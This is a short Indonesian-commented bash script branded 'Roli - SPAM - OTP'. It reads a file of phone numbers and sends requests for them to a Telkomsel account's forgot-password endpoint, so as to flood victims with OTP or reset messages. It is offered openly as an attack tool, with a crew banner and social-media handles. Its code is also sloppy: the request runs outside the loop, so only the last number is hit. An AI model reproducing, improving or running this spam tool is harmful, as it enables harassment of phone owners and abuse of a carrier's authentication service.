#!/bin/bash
# FB: fb.me/widhisec | IG : @widhisec | YT : zsecc0de-crew ID
# ga usah di recode capek w bikin
function ceklist() 
{
	found="NOT FOUND!"
         if [[ ! -f $asu ]]; then
         	printf "%s $found\n"
         	exit 1
         fi
}
###############################################################################
clear
GREEN=$(tput setaf 2) #HIJAU
RED=$(tput setaf 1) #MERAH
CYAN=$(tput setaf 6) #CYAN
WHITE=$(tput setaf 7) #PUTIH
NORMAL=$(tput sgr0) #NORMAL
###############################################################################
function menu() {
echo -e "
               ${RED}  Roli - SPAM - OTP
${GREEN}-------------------------------------------------------------------
${RED} ██╗    ██╗██╗██████╗ ██╗  ██╗██╗███████╗███████╗ ██████╗
 ██║    ██║██║██╔══██╗██║  ██║██║██╔════╝██╔════╝██╔════╝
 ██║ █╗ ██║██║██║  ██║███████║██║███████╗█████╗  ██║     
$WHITE ██║███╗██║██║██║  ██║██╔══██║██║╚════██║██╔══╝  ██║     
${WHITE} ╚███╔███╔╝██║██████╔╝██║  ██║██║███████║███████╗╚██████╗
  ╚══╝╚══╝ ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝        
              [Powered by ZseCc0de-Crew.ID]
-------------------------------------------------------------------                                                                 
"
}
menu
function rol()
{
	          H="Upgrade-Insecure-Requests: 1"
              D="msisdn=$x"
              R="https://roli.telkomsel.com/auth/forgot_password"
}
function rol1(){
	                     read -p "list here :" asu
	                     ceklist
              for x in $(cat $asu); do
              rol
              done
	                   c=$(curl -s $R --data $D \
	         -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
             -H "Accept-Language: en-US,en;q=0.5" \
             -H "Referer: https://roli.telkomsel.com/auth/forgot_password" \
             -H $H --compressed | grep -Po '(?<="message":)[^,]*')
}
rol1;printf "STATUS:$c \n"
function agr() { if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi }